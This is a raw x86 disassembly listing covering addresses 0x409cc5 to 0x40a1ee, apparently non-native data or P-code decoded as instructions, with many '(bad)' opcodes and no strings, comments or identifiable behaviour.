  409cc5:	00 00                	add    %al,(%eax)
  409cc7:	31 70 ff             	xor    %esi,-0x1(%eax)
  409cca:	00 05 4b ff ff 00    	add    %al,0xffff4b
  409cd0:	14 6c                	adc    $0x6c,%al
  409cd2:	70 ff                	jo     0x409cd3
  409cd4:	80 10 00             	adcb   $0x0,(%eax)
  409cd7:	2a 46 60             	sub    0x60(%esi),%al
  409cda:	ff 0a                	decl   (%edx)
  409cdc:	01 00                	add    %eax,(%eax)
  409cde:	04 00                	add    $0x0,%al
  409ce0:	35 60 ff 00 07       	xor    $0x700ff60,%eax
  409ce5:	0a 02                	or     (%edx),%al
  409ce7:	00 00                	add    %al,(%eax)
  409ce9:	00 00                	add    %al,(%eax)
  409ceb:	17                   	pop    %ss
  409cec:	6c                   	insb   (%dx),%es:(%edi)
  409ced:	70 ff                	jo     0x409cee
  409cef:	80 0c 00 2a          	orb    $0x2a,(%eax,%eax,1)
  409cf3:	23 4c ff f4          	and    -0xc(%edi,%edi,8),%ecx
  409cf7:	01 f4                	add    %esi,%esp
  409cf9:	ff                   	(bad)
  409cfa:	fe                   	(bad)
  409cfb:	5d                   	pop    %ebp
  409cfc:	20 00                	and    %al,(%eax)
  409cfe:	2f                   	das
  409cff:	4c                   	dec    %esp
  409d00:	ff 00                	incl   (%eax)
  409d02:	11 f4                	adc    %esi,%esp
  409d04:	01 5e 03             	add    %ebx,0x3(%esi)
  409d07:	00 04 00             	add    %al,(%eax,%eax,1)
  409d0a:	fd                   	std
  409d0b:	69 50 ff fc f6 3c ff 	imul   $0xff3cf6fc,-0x1(%eax),%edx
  409d12:	00 0f                	add    %cl,(%edi)
  409d14:	04 3c                	add    $0x3c,%al
  409d16:	ff                   	(bad)
  409d17:	fc                   	cld
  409d18:	22 0b                	and    (%ebx),%cl
  409d1a:	04 00                	add    $0x0,%al
  409d1c:	04 00                	add    $0x0,%al
  409d1e:	31 78 ff             	xor    %edi,-0x1(%eax)
  409d21:	00 0e                	add    %cl,(%esi)
  409d23:	f4                   	hlt
  409d24:	01 04 78             	add    %eax,(%eax,%edi,2)
  409d27:	ff f5                	push   %ebp
  409d29:	00 00                	add    %al,(%eax)
  409d2b:	00 00                	add    %al,(%eax)
  409d2d:	fc                   	cld
  409d2e:	75 00                	jne    0x409d30
  409d30:	06                   	push   %es
  409d31:	f4                   	hlt
  409d32:	01 fd                	add    %edi,%ebp
  409d34:	3d 00 12 04 3c       	cmp    $0x3c041200,%eax
  409d39:	ff 28                	ljmp   *(%eax)
  409d3b:	50                   	push   %eax
  409d3c:	ff 01                	incl   (%ecx)
  409d3e:	00 fb                	add    %bh,%bl
  409d40:	94                   	xchg   %eax,%esp
  409d41:	60                   	pusha
  409d42:	ff                   	(bad)
  409d43:	fc                   	cld
  409d44:	f6 3c ff             	idivb  (%edi,%edi,8)
  409d47:	00 17                	add    %dl,(%edi)
  409d49:	6c                   	insb   (%dx),%es:(%edi)
  409d4a:	70 ff                	jo     0x409d4b
  409d4c:	80 10 00             	adcb   $0x0,(%eax)
  409d4f:	2a 23                	sub    (%ebx),%ah
  409d51:	4c                   	dec    %esp
  409d52:	ff f4                	push   %esp
  409d54:	02 f4                	add    %ah,%dh
  409d56:	ff                   	(bad)
  409d57:	fe                   	(bad)
  409d58:	5d                   	pop    %ebp
  409d59:	20 00                	and    %al,(%eax)
  409d5b:	2f                   	das
  409d5c:	4c                   	dec    %esp
  409d5d:	ff 00                	incl   (%eax)
  409d5f:	0e                   	push   %cs
  409d60:	f4                   	hlt
  409d61:	02 04 78             	add    (%eax,%edi,2),%al
  409d64:	ff f5                	push   %ebp
  409d66:	00 00                	add    %al,(%eax)
  409d68:	00 00                	add    %al,(%eax)
  409d6a:	fc                   	cld
  409d6b:	77 00                	ja     0x409d6d
  409d6d:	17                   	pop    %ss
  409d6e:	6c                   	insb   (%dx),%es:(%edi)
  409d6f:	70 ff                	jo     0x409d70
  409d71:	1b 05 00 2a 23 4c    	sbb    0x4c232a00,%eax
  409d77:	ff f4                	push   %esp
  409d79:	03 f4                	add    %esp,%esi
  409d7b:	ff                   	(bad)
  409d7c:	fe                   	(bad)
  409d7d:	5d                   	pop    %ebp
  409d7e:	20 00                	and    %al,(%eax)
  409d80:	2f                   	das
  409d81:	4c                   	dec    %esp
  409d82:	ff 00                	incl   (%eax)
  409d84:	11 f4                	adc    %esi,%esp
  409d86:	03 5e 03             	add    0x3(%esi),%ebx
  409d89:	00 04 00             	add    %al,(%eax,%eax,1)
  409d8c:	0b 04 00             	or     (%eax,%eax,1),%eax
  409d8f:	04 00                	add    $0x0,%al
  409d91:	31 78 ff             	xor    %edi,-0x1(%eax)
  409d94:	00 0e                	add    %cl,(%esi)
  409d96:	f4                   	hlt
  409d97:	03 04 78             	add    (%eax,%edi,2),%eax
  409d9a:	ff f5                	push   %ebp
  409d9c:	00 00                	add    %al,(%eax)
  409d9e:	00 00                	add    %al,(%eax)
  409da0:	fc                   	cld
  409da1:	75 00                	jne    0x409da3
  409da3:	06                   	push   %es
  409da4:	f4                   	hlt
  409da5:	03 fd                	add    %ebp,%edi
  409da7:	3d 00 13 f4 02       	cmp    $0x2f41300,%eax
  409dac:	04 3c                	add    $0x3c,%al
  409dae:	ff                   	(bad)
  409daf:	fc                   	cld
  409db0:	22 04 78             	and    (%eax,%edi,2),%al
  409db3:	ff f5                	push   %ebp
  409db5:	00 00                	add    %al,(%eax)
  409db7:	00 00                	add    %al,(%eax)
  409db9:	fc                   	cld
  409dba:	78 00                	js     0x409dbc
  409dbc:	06                   	push   %es
  409dbd:	f4                   	hlt
  409dbe:	02 fd                	add    %ch,%bh
  409dc0:	3d 00 16 1b 05       	cmp    $0x51b1600,%eax
  409dc5:	00 43 4c             	add    %al,0x4c(%ebx)
  409dc8:	ff 04 4c             	incl   (%esp,%ecx,2)
  409dcb:	ff 6c 0c 00          	ljmp   *0x0(%esp,%ecx,1)
  409dcf:	0a 06                	or     (%esi),%al
  409dd1:	00 08                	add    %cl,(%eax)
  409dd3:	00 2f                	add    %ch,(%edi)
  409dd5:	4c                   	dec    %esp
  409dd6:	ff 00                	incl   (%eax)
  409dd8:	00 14 00             	add    %dl,(%eax,%eax,1)
  409ddb:	00 94 6c 40 00 0c 00 	add    %dl,0xc0040(%esp,%ebp,2)
  409de2:	40                   	inc    %eax
  409de3:	00 20                	add    %ah,(%eax)
  409de5:	01 30                	add    %esi,(%eax)
  409de7:	00 00                	add    %al,(%eax)
  409de9:	00 00                	add    %al,(%eax)
  409deb:	00 00                	add    %al,(%eax)
  409ded:	00 13                	add    %dl,(%ebx)
  409def:	00 00                	add    %al,(%eax)
  409df1:	00 00                	add    %al,(%eax)
  409df3:	00 18                	add    %bl,(%eax)
  409df5:	00 00                	add    %al,(%eax)
  409df7:	00 00                	add    %al,(%eax)
  409df9:	00 03                	add    %al,(%ebx)
  409dfb:	00 00                	add    %al,(%eax)
  409dfd:	00 00                	add    %al,(%eax)
  409dff:	00 70 ff             	add    %dh,-0x1(%eax)
  409e02:	01 00                	add    %eax,(%eax)
  409e04:	3c ff                	cmp    $0xff,%al
  409e06:	02 00                	add    (%eax),%al
  409e08:	78 ff                	js     0x409e09
  409e0a:	01 00                	add    %eax,(%eax)
  409e0c:	14 00                	adc    $0x0,%al
  409e0e:	00 00                	add    %al,(%eax)
  409e10:	00 00                	add    %al,(%eax)
  409e12:	02 00                	add    (%eax),%al
  409e14:	00 00                	add    %al,(%eax)
  409e16:	00 00                	add    %al,(%eax)
  409e18:	4c                   	dec    %esp
  409e19:	ff 01                	incl   (%ecx)
  409e1b:	00 60 ff             	add    %ah,-0x1(%eax)
  409e1e:	02 00                	add    (%eax),%al
  409e20:	f5                   	cmc
  409e21:	00 00                	add    %al,(%eax)
  409e23:	00 00                	add    %al,(%eax)
  409e25:	1b 05 00 04 70 ff    	sbb    0xff700400,%eax
  409e2b:	34 6c                	xor    $0x6c,%al
  409e2d:	70 ff                	jo     0x409e2e
  409e2f:	5e                   	pop    %esi
  409e30:	06                   	push   %es
  409e31:	00 08                	add    %cl,(%eax)
  409e33:	00 71 6c             	add    %dh,0x6c(%ecx)
  409e36:	ff                   	(bad)
  409e37:	3c 6c                	cmp    $0x6c,%al
  409e39:	6c                   	insb   (%dx),%es:(%edi)
  409e3a:	ff                   	(bad)
  409e3b:	fd                   	std
  409e3c:	69 4c ff fc f6 5c ff 	imul   $0x2fff5cf6,-0x4(%edi,%edi,8),%ecx
  409e43:	2f 
  409e44:	70 ff                	jo     0x409e45
  409e46:	04 5c                	add    $0x5c,%al
  409e48:	ff 28                	ljmp   *(%eax)
  409e4a:	4c                   	dec    %esp
  409e4b:	ff 00                	incl   (%eax)
  409e4d:	00 5d fb             	add    %bl,-0x5(%ebp)
  409e50:	33 1c 37             	xor    (%edi,%esi,1),%ebx
  409e53:	00 1e                	add    %bl,(%esi)
  409e55:	3a 00                	cmp    (%eax),%al
  409e57:	1e                   	push   %ds
  409e58:	71 00                	jno    0x409e5a
  409e5a:	f5                   	cmc
  409e5b:	00 00                	add    %al,(%eax)
  409e5d:	00 00                	add    %al,(%eax)
  409e5f:	1b 07                	sbb    (%edi),%eax
  409e61:	00 04 70             	add    %al,(%eax,%esi,2)
  409e64:	ff 34 6c             	push   (%esp,%ebp,2)
  409e67:	70 ff                	jo     0x409e68
  409e69:	5e                   	pop    %esi
  409e6a:	06                   	push   %es
  409e6b:	00 08                	add    %cl,(%eax)
  409e6d:	00 71 6c             	add    %dh,0x6c(%ecx)
  409e70:	ff                   	(bad)
  409e71:	3c 6c                	cmp    $0x6c,%al
  409e73:	6c                   	insb   (%dx),%es:(%edi)
  409e74:	ff                   	(bad)
  409e75:	fd                   	std
  409e76:	69 4c ff fc f6 5c ff 	imul   $0x2fff5cf6,-0x4(%edi,%edi,8),%ecx
  409e7d:	2f 
  409e7e:	70 ff                	jo     0x409e7f
  409e80:	04 5c                	add    $0x5c,%al
  409e82:	ff 28                	ljmp   *(%eax)
  409e84:	4c                   	dec    %esp
  409e85:	ff 00                	incl   (%eax)
  409e87:	00 5d fb             	add    %bl,-0x5(%ebp)
  409e8a:	33 1c 71             	xor    (%ecx,%esi,2),%ebx
  409e8d:	00 1e                	add    %bl,(%esi)
  409e8f:	71 00                	jno    0x409e91
  409e91:	04 5c                	add    $0x5c,%al
  409e93:	ff                   	(bad)
  409e94:	fc                   	cld
  409e95:	22 5e 08             	and    0x8(%esi),%bl
  409e98:	00 04 00             	add    %al,(%eax,%eax,1)
  409e9b:	71 6c                	jno    0x409f09
  409e9d:	ff                   	(bad)
  409e9e:	3c f5                	cmp    $0xf5,%al
  409ea0:	00 00                	add    %al,(%eax)
  409ea2:	00 00                	add    %al,(%eax)
  409ea4:	0b 09                	or     (%ecx),%ecx
  409ea6:	00 04 00             	add    %al,(%eax,%eax,1)
  409ea9:	46                   	inc    %esi
  409eaa:	3c ff                	cmp    $0xff,%al
  409eac:	6c                   	insb   (%dx),%es:(%edi)
  409ead:	6c                   	insb   (%dx),%es:(%edi)
  409eae:	ff f5                	push   %ebp
  409eb0:	01 00                	add    %eax,(%eax)
  409eb2:	00 00                	add    %al,(%eax)
  409eb4:	aa                   	stos   %al,%es:(%edi)
  409eb5:	04 2c                	add    $0x2c,%al
  409eb7:	ff 0a                	decl   (%edx)
  409eb9:	0a 00                	or     (%eax),%al
  409ebb:	0c 00                	or     $0x0,%al
  409ebd:	04 2c                	add    $0x2c,%al
  409ebf:	ff 60 31             	jmp    *0x31(%eax)
  409ec2:	74 ff                	je     0x409ec3
  409ec4:	36 04 00             	ss add $0x0,%al
  409ec7:	3c ff                	cmp    $0xff,%al
  409ec9:	2c ff                	sub    $0xff,%al
  409ecb:	6c                   	insb   (%dx),%es:(%edi)
  409ecc:	74 ff                	je     0x409ecd
  409ece:	4a                   	dec    %edx
  409ecf:	6c                   	insb   (%dx),%es:(%edi)
  409ed0:	74 ff                	je     0x409ed1
  409ed2:	04 70                	add    $0x70,%al
  409ed4:	ff 34 6c             	push   (%esp,%ebp,2)
  409ed7:	70 ff                	jo     0x409ed8
  409ed9:	04 5c                	add    $0x5c,%al
  409edb:	ff                   	(bad)
  409edc:	fc                   	cld
  409edd:	22 0a                	and    (%edx),%cl
  409edf:	0b 00                	or     (%eax),%eax
  409ee1:	0c 00                	or     $0x0,%al
  409ee3:	3c 6c                	cmp    $0x6c,%al
  409ee5:	70 ff                	jo     0x409ee6
  409ee7:	04 74                	add    $0x74,%al
  409ee9:	ff                   	(bad)
  409eea:	fc                   	cld
  409eeb:	58                   	pop    %eax
  409eec:	2f                   	das
  409eed:	70 ff                	jo     0x409eee
  409eef:	f5                   	cmc
  409ef0:	01 00                	add    %eax,(%eax)
  409ef2:	00 00                	add    %al,(%eax)
  409ef4:	6c                   	insb   (%dx),%es:(%edi)
  409ef5:	74 ff                	je     0x409ef6
  409ef7:	f5                   	cmc
  409ef8:	00 00                	add    %al,(%eax)
  409efa:	00 00                	add    %al,(%eax)
  409efc:	0b 09                	or     (%ecx),%ecx
  409efe:	00 04 00             	add    %al,(%eax,%eax,1)
  409f01:	23 70 ff             	and    -0x1(%eax),%esi
  409f04:	f5                   	cmc
  409f05:	00 00                	add    %al,(%eax)
  409f07:	00 00                	add    %al,(%eax)
  409f09:	fe                   	(bad)
  409f0a:	fd                   	std
  409f0b:	f5                   	cmc
  409f0c:	01 00                	add    %eax,(%eax)
  409f0e:	00 00                	add    %al,(%eax)
  409f10:	ae                   	scas   %es:(%edi),%al
  409f11:	6c                   	insb   (%dx),%es:(%edi)
  409f12:	74 ff                	je     0x409f13
  409f14:	0b 0c 00             	or     (%eax,%eax,1),%ecx
  409f17:	08 00                	or     %al,(%eax)
  409f19:	31 74 ff 2f          	xor    %esi,0x2f(%edi,%edi,8)
  409f1d:	70 ff                	jo     0x409f1e
  409f1f:	6c                   	insb   (%dx),%es:(%edi)
  409f20:	74 ff                	je     0x409f21
  409f22:	1b 04 00             	sbb    (%eax,%eax,1),%eax
  409f25:	2a 31                	sub    (%ecx),%dh
  409f27:	78 ff                	js     0x409f28
  409f29:	6c                   	insb   (%dx),%es:(%edi)
  409f2a:	74 ff                	je     0x409f2b
  409f2c:	4a                   	dec    %edx
  409f2d:	f5                   	cmc
  409f2e:	03 00                	add    (%eax),%eax
  409f30:	00 00                	add    %al,(%eax)
  409f32:	c7                   	(bad)
  409f33:	1c 1c                	sbb    $0x1c,%al
  409f35:	01 6c 74 ff          	add    %ebp,-0x1(%esp,%esi,2)
  409f39:	43                   	inc    %ebx
  409f3a:	78 ff                	js     0x409f3b
  409f3c:	14 00                	adc    $0x0,%al
  409f3e:	00 00                	add    %al,(%eax)
  409f40:	08 6d 40             	or     %ch,0x40(%ebp)
  409f43:	00 04 00             	add    %al,(%eax,%eax,1)
  409f46:	50                   	push   %eax
  409f47:	00 20                	add    %ah,(%eax)
  409f49:	01 30                	add    %esi,(%eax)
  409f4b:	00 00                	add    %al,(%eax)
  409f4d:	00 00                	add    %al,(%eax)
  409f4f:	00 00                	add    %al,(%eax)
  409f51:	00 13                	add    %dl,(%ebx)
  409f53:	00 00                	add    %al,(%eax)
  409f55:	00 00                	add    %al,(%eax)
  409f57:	00 18                	add    %bl,(%eax)
  409f59:	00 00                	add    %al,(%eax)
  409f5b:	00 00                	add    %al,(%eax)
  409f5d:	00 03                	add    %al,(%ebx)
  409f5f:	00 00                	add    %al,(%eax)
  409f61:	00 00                	add    %al,(%eax)
  409f63:	01 78 ff             	add    %edi,-0x1(%eax)
  409f66:	01 00                	add    %eax,(%eax)
  409f68:	74 ff                	je     0x409f69
  409f6a:	01 00                	add    %eax,(%eax)
  409f6c:	5c                   	pop    %esp
  409f6d:	ff 02                	incl   (%edx)
  409f6f:	00 18                	add    %bl,(%eax)
  409f71:	00 00                	add    %al,(%eax)
  409f73:	00 00                	add    %al,(%eax)
  409f75:	00 03                	add    %al,(%ebx)
  409f77:	00 00                	add    %al,(%eax)
  409f79:	00 00                	add    %al,(%eax)
  409f7b:	00 70 ff             	add    %dh,-0x1(%eax)
  409f7e:	01 00                	add    %eax,(%eax)
  409f80:	3c ff                	cmp    $0xff,%al
  409f82:	02 00                	add    (%eax),%al
  409f84:	2c ff                	sub    $0xff,%al
  409f86:	02 00                	add    (%eax),%al
  409f88:	00 02                	add    %al,(%edx)
  409f8a:	00 05 4b ff ff 00    	add    %al,0xffff4b
  409f90:	16                   	push   %ss
  409f91:	0b 07                	or     (%edi),%eax
  409f93:	00 00                	add    %al,(%eax)
  409f95:	00 fd                	add    %bh,%ch
  409f97:	c7                   	(bad)
  409f98:	68 ff 0b 11 00       	push   $0x110bff
  409f9d:	04 00                	add    $0x0,%al
  409f9f:	2f                   	das
  409fa0:	68 ff 1c 22 00       	push   $0x221cff
  409fa5:	00 05 1e 59 00 00    	add    %al,0x591e
  409fab:	37                   	aaa
  409fac:	0b 07                	or     (%edi),%eax
  409fae:	00 00                	add    %al,(%eax)
  409fb0:	00 23                	add    %ah,(%ebx)
  409fb2:	68 ff 0b 12 00       	push   $0x120bff
  409fb7:	00 00                	add    %al,(%eax)
  409fb9:	23 64 ff 2a          	and    0x2a(%edi,%edi,8),%esp
  409fbd:	23 60 ff             	and    -0x1(%eax),%esp
  409fc0:	1b 04 00             	sbb    (%eax,%eax,1),%eax
  409fc3:	2a fd                	sub    %ch,%bh
  409fc5:	c7                   	(bad)
  409fc6:	5c                   	pop    %esp
  409fc7:	ff 6c 10 00          	ljmp   *0x0(%eax,%edx,1)
  409fcb:	04 4c                	add    $0x4c,%al
  409fcd:	ff 0a                	decl   (%edx)
  409fcf:	13 00                	adc    (%eax),%eax
  409fd1:	0c 00                	or     $0x0,%al
  409fd3:	32 08                	xor    (%eax),%cl
  409fd5:	00 68 ff             	add    %ch,-0x1(%eax)
  409fd8:	64 ff 60 ff          	jmp    *%fs:-0x1(%eax)
  409fdc:	5c                   	pop    %esp
  409fdd:	ff 35 4c ff 00 22    	push   0x2200ff4c
  409fe3:	f5                   	cmc
  409fe4:	10 00                	adc    %al,(%eax)
  409fe6:	00 00                	add    %al,(%eax)
  409fe8:	6c                   	insb   (%dx),%es:(%edi)
  409fe9:	14 00                	adc    $0x0,%al
  409feb:	4d                   	dec    %ebp
  409fec:	3c ff                	cmp    $0xff,%al
  409fee:	08 40 0b             	or     %al,0xb(%eax)
  409ff1:	14 00                	adc    $0x0,%al
  409ff3:	08 00                	or     %al,(%eax)
  409ff5:	23 68 ff             	and    -0x1(%eax),%ebp
  409ff8:	1b 0a                	sbb    (%edx),%ecx
  409ffa:	00 fb                	add    %bh,%bl
  409ffc:	30 2f                	xor    %ch,(%edi)
  409ffe:	68 ff 1c 81 00       	push   $0x811cff
  40a003:	00 06                	add    %al,(%esi)
  40a005:	fd                   	std
  40a006:	95                   	xchg   %eax,%ebp
  40a007:	10 00                	adc    %al,(%eax)
  40a009:	00 0d 6c 14 00 0b    	add    %cl,0xb00146c
  40a00f:	11 00                	adc    %eax,(%eax)
  40a011:	04 00                	add    $0x0,%al
  40a013:	1c 94                	sbb    $0x94,%al
  40a015:	00 00                	add    %al,(%eax)
  40a017:	06                   	push   %es
  40a018:	fd                   	std
  40a019:	95                   	xchg   %eax,%ebp
  40a01a:	10 00                	adc    %al,(%eax)
  40a01c:	00 0e                	add    %cl,(%esi)
  40a01e:	0b 12                	or     (%edx),%edx
  40a020:	00 00                	add    %al,(%eax)
  40a022:	00 46 4c             	add    %al,0x4c(%esi)
  40a025:	ff                   	(bad)
  40a026:	fc                   	cld
  40a027:	f6 2c ff             	imulb  (%edi,%edi,8)
  40a02a:	00 34 80             	add    %dh,(%eax,%eax,4)
  40a02d:	14 00                	adc    $0x0,%al
  40a02f:	46                   	inc    %esi
  40a030:	3c ff                	cmp    $0xff,%al
  40a032:	04 2c                	add    $0x2c,%al
  40a034:	ff                   	(bad)
  40a035:	fb                   	sti
  40a036:	94                   	xchg   %eax,%esp
  40a037:	4c                   	dec    %esp
  40a038:	ff                   	(bad)
  40a039:	3a 1c ff             	cmp    (%edi,%edi,8),%bl
  40a03c:	04 00                	add    $0x0,%al
  40a03e:	fb                   	sti
  40a03f:	94                   	xchg   %eax,%esp
  40a040:	0c ff                	or     $0xff,%al
  40a042:	60                   	pusha
  40a043:	fd                   	std
  40a044:	c7                   	(bad)
  40a045:	68 ff 6c 10 00       	push   $0x106cff
  40a04a:	04 fc                	add    $0xfc,%al
  40a04c:	fe 0a                	decb   (%edx)
  40a04e:	13 00                	adc    (%eax),%eax
  40a050:	0c 00                	or     $0x0,%al
  40a052:	2f                   	das
  40a053:	68 ff 36 06 00       	push   $0x636ff
  40a058:	4c                   	dec    %esp
  40a059:	ff 0c ff             	decl   (%edi,%edi,8)
  40a05c:	fc                   	cld
  40a05d:	fe 00                	incb   (%eax)
  40a05f:	38 f5                	cmp    %dh,%ch
  40a061:	02 00                	add    (%eax),%al
  40a063:	00 00                	add    %al,(%eax)
  40a065:	80 14 00 46          	adcb   $0x46,(%eax,%eax,1)
  40a069:	3c ff                	cmp    $0xff,%al
  40a06b:	04 2c                	add    $0x2c,%al
  40a06d:	ff                   	(bad)
  40a06e:	fb                   	sti
  40a06f:	94                   	xchg   %eax,%esp
  40a070:	4c                   	dec    %esp
  40a071:	ff                   	(bad)
  40a072:	3a 1c ff             	cmp    (%edi,%edi,8),%bl
  40a075:	15 00 fb 94 0c       	adc    $0xc94fb00,%eax
  40a07a:	ff 80 14 00 46 ec    	incl   -0x13b9ffec(%eax)
  40a080:	fe                   	(bad)
  40a081:	fb                   	sti
  40a082:	94                   	xchg   %eax,%esp
  40a083:	fc                   	cld
  40a084:	fe 0a                	decb   (%edx)
  40a086:	16                   	push   %ss
  40a087:	00 08                	add    %cl,(%eax)
  40a089:	00 74 e4 fe          	add    %dh,-0x2(%esp,%eiz,8)
  40a08d:	36 06                	ss push %es
  40a08f:	00 4c ff 0c          	add    %cl,0xc(%edi,%edi,8)
  40a093:	ff                   	(bad)
  40a094:	fc                   	cld
  40a095:	fe 00                	incb   (%eax)
  40a097:	00 fd                	add    %bh,%ch
  40a099:	95                   	xchg   %eax,%ebp
  40a09a:	10 00                	adc    %al,(%eax)
  40a09c:	80 70 40 00          	xorb   $0x0,0x40(%eax)
  40a0a0:	10 00                	adc    %al,(%eax)
  40a0a2:	98                   	cwtl
  40a0a3:	00 14 01             	add    %dl,(%ecx,%eax,1)
  40a0a6:	2c 00                	sub    $0x0,%al
  40a0a8:	00 00                	add    %al,(%eax)
  40a0aa:	00 00                	add    %al,(%eax)
  40a0ac:	00 00                	add    %al,(%eax)
  40a0ae:	13 00                	adc    (%eax),%eax
  40a0b0:	00 00                	add    %al,(%eax)
  40a0b2:	00 00                	add    %al,(%eax)
  40a0b4:	14 00                	adc    $0x0,%al
  40a0b6:	00 00                	add    %al,(%eax)
  40a0b8:	00 00                	add    %al,(%eax)
  40a0ba:	02 00                	add    (%eax),%al
  40a0bc:	00 00                	add    %al,(%eax)
  40a0be:	00 01                	add    %al,(%ecx)
  40a0c0:	6c                   	insb   (%dx),%es:(%edi)
  40a0c1:	ff 02                	incl   (%edx)
  40a0c3:	00 2c ff             	add    %ch,(%edi,%edi,8)
  40a0c6:	02 00                	add    (%eax),%al
  40a0c8:	28 00                	sub    %al,(%eax)
  40a0ca:	00 00                	add    %al,(%eax)
  40a0cc:	00 00                	add    %al,(%eax)
  40a0ce:	07                   	pop    %es
  40a0cf:	00 00                	add    %al,(%eax)
  40a0d1:	00 00                	add    %al,(%eax)
  40a0d3:	00 68 ff             	add    %ch,-0x1(%eax)
  40a0d6:	01 00                	add    %eax,(%eax)
  40a0d8:	64 ff 01             	incl   %fs:(%ecx)
  40a0db:	00 60 ff             	add    %ah,-0x1(%eax)
  40a0de:	01 00                	add    %eax,(%eax)
  40a0e0:	5c                   	pop    %esp
  40a0e1:	ff 01                	incl   (%ecx)
  40a0e3:	00 4c ff 02          	add    %cl,0x2(%edi,%edi,8)
  40a0e7:	00 0c ff             	add    %cl,(%edi,%edi,8)
  40a0ea:	02 00                	add    (%eax),%al
  40a0ec:	fc                   	cld
  40a0ed:	fe 02                	incb   (%edx)
  40a0ef:	00 1b                	add    %bl,(%ebx)
  40a0f1:	17                   	pop    %ss
  40a0f2:	00 43 58             	add    %al,0x58(%ebx)
  40a0f5:	ff 04 58             	incl   (%eax,%ebx,2)
  40a0f8:	ff 1b                	lcall  *(%ebx)
  40a0fa:	18 00                	sbb    %al,(%eax)
  40a0fc:	43                   	inc    %ebx
  40a0fd:	5c                   	pop    %esp
  40a0fe:	ff 04 5c             	incl   (%esp,%ebx,2)
  40a101:	ff 1b                	lcall  *(%ebx)
  40a103:	19 00                	sbb    %eax,(%eax)
  40a105:	43                   	inc    %ebx
  40a106:	60                   	pusha
  40a107:	ff 04 60             	incl   (%eax,%eiz,2)
  40a10a:	ff f5                	push   %ebp
  40a10c:	01 00                	add    %eax,(%eax)
  40a10e:	00 80 59 64 ff f5    	add    %al,-0xa009ba7(%eax)
  40a114:	04 00                	add    $0x0,%al
  40a116:	00 00                	add    %al,(%eax)
  40a118:	59                   	pop    %ecx
  40a119:	68 ff 0a 1a 00       	push   $0x1a0aff
  40a11e:	14 00                	adc    $0x0,%al
  40a120:	32 06                	xor    (%esi),%al
  40a122:	00 60 ff             	add    %ah,-0x1(%eax)
  40a125:	5c                   	pop    %esp
  40a126:	ff 58 ff             	lcall  *-0x1(%eax)
  40a129:	1b 17                	sbb    (%edi),%edx
  40a12b:	00 43 58             	add    %al,0x58(%ebx)
  40a12e:	ff 04 58             	incl   (%eax,%ebx,2)
  40a131:	ff 1b                	lcall  *(%ebx)
  40a133:	1b 00                	sbb    (%eax),%eax
  40a135:	43                   	inc    %ebx
  40a136:	5c                   	pop    %esp
  40a137:	ff 04 5c             	incl   (%esp,%ebx,2)
  40a13a:	ff 1b                	lcall  *(%ebx)
  40a13c:	1c 00                	sbb    $0x0,%al
  40a13e:	43                   	inc    %ebx
  40a13f:	60                   	pusha
  40a140:	ff 04 60             	incl   (%eax,%eiz,2)
  40a143:	ff f5                	push   %ebp
  40a145:	01 00                	add    %eax,(%eax)
  40a147:	00 80 59 64 ff f5    	add    %al,-0xa009ba7(%eax)
  40a14d:	04 00                	add    $0x0,%al
  40a14f:	00 00                	add    %al,(%eax)
  40a151:	59                   	pop    %ecx
  40a152:	68 ff 0a 1a 00       	push   $0x1a0aff
  40a157:	14 00                	adc    $0x0,%al
  40a159:	32 06                	xor    (%esi),%al
  40a15b:	00 60 ff             	add    %ah,-0x1(%eax)
  40a15e:	5c                   	pop    %esp
  40a15f:	ff 58 ff             	lcall  *-0x1(%eax)
  40a162:	1b 1d 00 43 58 ff    	sbb    0xff584300,%ebx
  40a168:	04 58                	add    $0x58,%al
  40a16a:	ff 1b                	lcall  *(%ebx)
  40a16c:	1e                   	push   %ds
  40a16d:	00 43 5c             	add    %al,0x5c(%ebx)
  40a170:	ff 04 5c             	incl   (%esp,%ebx,2)
  40a173:	ff 1b                	lcall  *(%ebx)
  40a175:	1c 00                	sbb    $0x0,%al
  40a177:	43                   	inc    %ebx
  40a178:	60                   	pusha
  40a179:	ff 04 60             	incl   (%eax,%eiz,2)
  40a17c:	ff f5                	push   %ebp
  40a17e:	01 00                	add    %eax,(%eax)
  40a180:	00 80 59 64 ff f5    	add    %al,-0xa009ba7(%eax)
  40a186:	04 00                	add    $0x0,%al
  40a188:	00 00                	add    %al,(%eax)
  40a18a:	59                   	pop    %ecx
  40a18b:	68 ff 0a 1a 00       	push   $0x1a0aff
  40a190:	14 00                	adc    $0x0,%al
  40a192:	32 06                	xor    (%esi),%al
  40a194:	00 60 ff             	add    %ah,-0x1(%eax)
  40a197:	5c                   	pop    %esp
  40a198:	ff 58 ff             	lcall  *-0x1(%eax)
  40a19b:	1b 17                	sbb    (%edi),%edx
  40a19d:	00 43 58             	add    %al,0x58(%ebx)
  40a1a0:	ff 04 58             	incl   (%eax,%ebx,2)
  40a1a3:	ff 1b                	lcall  *(%ebx)
  40a1a5:	1f                   	pop    %ds
  40a1a6:	00 43 5c             	add    %al,0x5c(%ebx)
  40a1a9:	ff 04 5c             	incl   (%esp,%ebx,2)
  40a1ac:	ff 1b                	lcall  *(%ebx)
  40a1ae:	20 00                	and    %al,(%eax)
  40a1b0:	43                   	inc    %ebx
  40a1b1:	60                   	pusha
  40a1b2:	ff 04 60             	incl   (%eax,%eiz,2)
  40a1b5:	ff f5                	push   %ebp
  40a1b7:	01 00                	add    %eax,(%eax)
  40a1b9:	00 80 59 64 ff f5    	add    %al,-0xa009ba7(%eax)
  40a1bf:	04 00                	add    $0x0,%al
  40a1c1:	00 00                	add    %al,(%eax)
  40a1c3:	59                   	pop    %ecx
  40a1c4:	68 ff 0a 1a 00       	push   $0x1a0aff
  40a1c9:	14 00                	adc    $0x0,%al
  40a1cb:	32 06                	xor    (%esi),%al
  40a1cd:	00 60 ff             	add    %ah,-0x1(%eax)
  40a1d0:	5c                   	pop    %esp
  40a1d1:	ff 58 ff             	lcall  *-0x1(%eax)
  40a1d4:	1b 17                	sbb    (%edi),%edx
  40a1d6:	00 43 58             	add    %al,0x58(%ebx)
  40a1d9:	ff 04 58             	incl   (%eax,%ebx,2)
  40a1dc:	ff 1b                	lcall  *(%ebx)
  40a1de:	1f                   	pop    %ds
  40a1df:	00 43 5c             	add    %al,0x5c(%ebx)
  40a1e2:	ff 04 5c             	incl   (%esp,%ebx,2)
  40a1e5:	ff 1b                	lcall  *(%ebx)
  40a1e7:	20 00                	and    %al,(%eax)
  40a1e9:	43                   	inc    %ebx
  40a1ea:	60                   	pusha
  40a1eb:	ff 04 60             	incl   (%eax,%eiz,2)
  40a1ee:	ff f5                	push   %ebp
